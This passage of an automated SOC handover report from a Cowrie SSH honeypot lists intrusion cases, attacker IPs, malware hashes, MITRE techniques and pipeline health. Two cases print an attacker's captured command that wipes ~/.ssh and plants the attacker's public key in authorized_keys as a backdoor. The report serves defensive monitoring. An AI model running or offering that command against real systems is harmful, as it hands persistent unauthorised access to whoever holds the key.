|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:41 |
| **Last Seen** | 2026-05-03 22:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:41:52` | `cowrie.session.connect` |
| `2026-05-03 22:41:52` | `cowrie.client.version` |
| `2026-05-03 22:41:52` | `cowrie.client.kex` |
| `2026-05-03 22:41:52` | `cowrie.login.success` |
| `2026-05-03 22:41:52` | `cowrie.session.params` |
| `2026-05-03 22:41:52` | `cowrie.command.input` |
| `2026-05-03 22:41:52` | `cowrie.command.failed` |
| `2026-05-03 22:41:52` | `cowrie.log.closed` |
| `2026-05-03 22:41:52` | `cowrie.session.params` |
| `2026-05-03 22:41:52` | `cowrie.command.input` |
| `2026-05-03 22:41:52` | `cowrie.session.file_download` |
| `2026-05-03 22:41:52` | `cowrie.log.closed` |
| `2026-05-03 22:41:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72132760023b

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:41 |
| **Last Seen** | 2026-05-03 22:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:41:53` | `cowrie.session.connect` |
| `2026-05-03 22:41:53` | `cowrie.client.version` |
| `2026-05-03 22:41:53` | `cowrie.client.kex` |
| `2026-05-03 22:41:53` | `cowrie.login.success` |
| `2026-05-03 22:41:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55d9d5ab6276

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:43 |
| **Last Seen** | 2026-05-03 22:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:43:22` | `cowrie.session.connect` |
| `2026-05-03 22:43:22` | `cowrie.client.version` |
| `2026-05-03 22:43:22` | `cowrie.client.kex` |
| `2026-05-03 22:43:22` | `cowrie.login.success` |
| `2026-05-03 22:43:22` | `cowrie.session.params` |
| `2026-05-03 22:43:22` | `cowrie.command.input` |
| `2026-05-03 22:43:22` | `cowrie.command.failed` |
| `2026-05-03 22:43:22` | `cowrie.log.closed` |
| `2026-05-03 22:43:22` | `cowrie.session.params` |
| `2026-05-03 22:43:22` | `cowrie.command.input` |
| `2026-05-03 22:43:22` | `cowrie.session.file_download` |
| `2026-05-03 22:43:22` | `cowrie.log.closed` |
| `2026-05-03 22:43:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dab29d90343

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:43 |
| **Last Seen** | 2026-05-03 22:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:43:23` | `cowrie.session.connect` |
| `2026-05-03 22:43:23` | `cowrie.client.version` |
| `2026-05-03 22:43:23` | `cowrie.client.kex` |
| `2026-05-03 22:43:23` | `cowrie.login.success` |
| `2026-05-03 22:43:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `182.18.161[.]165` | **31** | 2026-05-03 22:16 | 2026-05-03 22:43 | 0m | 31 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `152.32.135[.]217` | **29** | 2026-05-03 21:07 | 2026-05-03 21:32 | 0m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `159.203.35[.]6` | **29** | 2026-05-03 21:10 | 2026-05-03 21:32 | 0m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `42.96.17[.]249` | **29** | 2026-05-03 20:52 | 2026-05-03 21:17 | 0m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.126.141[.]180` | **2** | 2026-05-03 22:41 | 2026-05-03 22:44 | 2m | 0 | `T1592` | 🟢 LOW |
| `123.195.113[.]212` | 1 | 2026-05-03 22:14 | 2026-05-03 22:14 | 36s | 0 | `T1592` | 🟢 LOW |
| `14.103.115[.]106` | 1 | 2026-05-03 20:51 | 2026-05-03 20:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `167.71.198[.]239` | 1 | 2026-05-03 22:35 | 2026-05-03 22:36 | 49s | 0 | `T1592` | 🟢 LOW |
| `183.195.131[.]206` | 1 | 2026-05-03 21:57 | 2026-05-03 21:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `203.110.233[.]225` | 1 | 2026-05-03 21:13 | 2026-05-03 21:14 | 49s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (26 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/74** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `152.32.135[.]217` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |
| `159.203.35[.]6` | CA | DigitalOcean, LLC | **100** ⚠️ | 50 |
| `42.96.17[.]249` | VN | Long Van System Solution JSC | **100** ⚠️ | 3 |
| `14.103.115[.]106` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `182.18.161[.]165` | IN | Pioneer Elabs Ltd. | **100** ⚠️ | 50 |
| `203.110.233[.]225` | CN | CHINANET FUJIAN PROVINCE NETWORK | **100** ⚠️ | 46 |
| `183.195.131[.]206` | CN | China Mobile Communications Corporation - shanghai company | **100** ⚠️ | 50 |
| `101.126.141[.]180` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 14 |
| `123.195.113[.]212` | TW | kbro CO. Ltd. | **95** ⚠️ | 13 |
| `167.71.198[.]239` | SG | DigitalOcean, LLC | **83** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 223 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 118 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 100 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 50 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 50 |

---

## 🔕 False Positive Summary (14 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 7 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 239 cases |
| Tool 34  | Credential Extractor        | ✅ 218 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 23 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 14 filtered (5.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 21 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 26 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 100 priority case(s) shown individually · 10 recon entry/entries in table (5 group(s) consolidating 120 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-03T22:50:03Z_
